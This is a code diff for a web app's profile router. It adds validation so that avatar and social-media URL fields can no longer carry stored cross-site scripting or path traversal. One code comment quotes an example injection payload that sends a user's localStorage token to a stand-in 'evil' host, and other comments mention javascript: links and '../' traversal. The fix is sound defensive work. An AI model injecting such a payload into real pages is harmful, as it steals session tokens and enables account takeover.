@@ -4,7 +4,7 @@ Profile Router — User profile management
 from fastapi import APIRouter, Depends, HTTPException
 from sqlalchemy.orm import Session
 from app.database import get_db
-from app.services.name_utils import split_full_name
+from app.services.name_utils import split_full_name, clean_display_name
 from app.models import User, Channel, Message, MessageType, ChannelType, Post, Payment, PaymentStatus
 from app.schemas import UserMemberOut, UserProfileUpdate, OnboardingUpdate
 from app.routers.users import get_current_user, get_current_active_member, hash_password, verify_password
@@ -18,6 +18,8 @@ import shutil
 from datetime import datetime, timedelta
 from app.services.otp_manager import send_otp, verify_otp
 from app.models import PhoneOTP
+from re import compile as _re_compile
+from urllib.parse import urlparse as _urlparse
 
 router = APIRouter(prefix="/profile", tags=["Profile"])
 
@@ -176,6 +178,54 @@ def _clean_display_text(value: str, limit: int) -> str:
     return cleaned.strip()[:limit]
 
 
+# ─── Client-supplied URL validation ────────────────────────
+# avatar_url is rendered into src="..." on almost every page of the site, and
+# tokens live in localStorage, so a value like
+#     x" onerror="fetch('//evil/'+localStorage.token)" x="
+# stored here and rendered by the admin member list is an owner-account
+# takeover. The render side escapes now (that is the real fix), but a field the
+# server will happily store as arbitrary markup should never have been one:
+# these are the only shapes a real avatar has ever had.
+AVATAR_PATH_RE = _re_compile(r"^/(uploads|static|files)/avatars/[A-Za-z0-9._-]{1,120}$")
+AVATAR_ALLOWED_HOSTS = {"ghawy.ai", "www.ghawy.ai"}
+SELECTED_AVATAR_RE = _re_compile(r"^[A-Za-z0-9._-]{1,64}\.(png|jpg|jpeg|webp|svg)$")
+
+
+def _validate_avatar_url(value: str) -> str:
+    """A path this server issued, or an https URL on a host we actually use."""
+    candidate = (value or "").strip()
+    if AVATAR_PATH_RE.match(candidate):
+        return candidate
+    parsed = _urlparse(candidate)
+    if parsed.scheme == "https" and parsed.hostname in AVATAR_ALLOWED_HOSTS:
+        return candidate
+    raise HTTPException(status_code=422, detail="avatar_url is not a valid avatar location")
+
+
+def _validate_selected_avatar(value: str) -> str:
+    """A preset avatar is a bare filename — never a path and never a URL.
+
+    It is both rendered directly as an image source and interpolated into
+    https://ghawy.ai/imgs/avatars/{...}, so "../../x" or a quote character here
+    escapes one or the other.
+    """
+    candidate = (value or "").strip()
+    if not SELECTED_AVATAR_RE.match(candidate):
+        raise HTTPException(status_code=422, detail="selected_avatar is not a valid preset")
+    return candidate
+
+
+def _validate_social_url(value: str) -> str:
+    """http(s) only. escapeHtml on the render side does not stop javascript:."""
+    candidate = (value or "").strip()
+    if not candidate:
+        return ""
+    parsed = _urlparse(candidate)
+    if parsed.scheme not in ("http", "https") or not parsed.netloc:
+        raise HTTPException(status_code=422, detail="social_media_url must be an http(s) link")
+    return candidate[:500]
+
+
 @router.put("/me", response_model=UserMemberOut)
 def update_my_profile(
     data: UserProfileUpdate,
@@ -183,15 +233,15 @@ def update_my_profile(
     db: Session = Depends(get_db),
 ):
     if data.full_name is not None:
-        current_user.full_name = _clean_display_text(data.full_name, limit=80)
+        current_user.full_name = clean_display_name(data.full_name, limit=80)
         # Keep the split columns in step with the display name.
         current_user.first_name, current_user.last_name = split_full_name(current_user.full_name)
     if data.bio is not None:
         current_user.bio = _clean_display_text(data.bio, limit=500)
     if data.avatar_url is not None:
-        current_user.avatar_url = data.avatar_url
+        current_user.avatar_url = _validate_avatar_url(data.avatar_url)
     if data.social_media_url is not None:
-        current_user.social_media_url = data.social_media_url
+        current_user.social_media_url = _validate_social_url(data.social_media_url)
     if data.show_social_media is not None:
         current_user.show_social_media = data.show_social_media
 
@@ -282,16 +332,17 @@ def complete_onboarding(
 
     # Update social media
     if data.social_media_url:
-        current_user.social_media_url = data.social_media_url
+        current_user.social_media_url = _validate_social_url(data.social_media_url)
 
     # Update avatar
     if data.avatar_url:
-        current_user.avatar_url = data.avatar_url
+        current_user.avatar_url = _validate_avatar_url(data.avatar_url)
     if data.selected_avatar:
-        current_user.selected_avatar = data.selected_avatar
+        preset = _validate_selected_avatar(data.selected_avatar)
+        current_user.selected_avatar = preset
         # Auto-set avatar_url from preset if no upload was provided
         if not data.avatar_url:
-            current_user.avatar_url = f"https://ghawy.ai/imgs/avatars/{data.selected_avatar}"
+            current_user.avatar_url = f"https://ghawy.ai/imgs/avatars/{preset}"
 
     # Mark onboarding as completed
     current_user.onboarding_completed = True
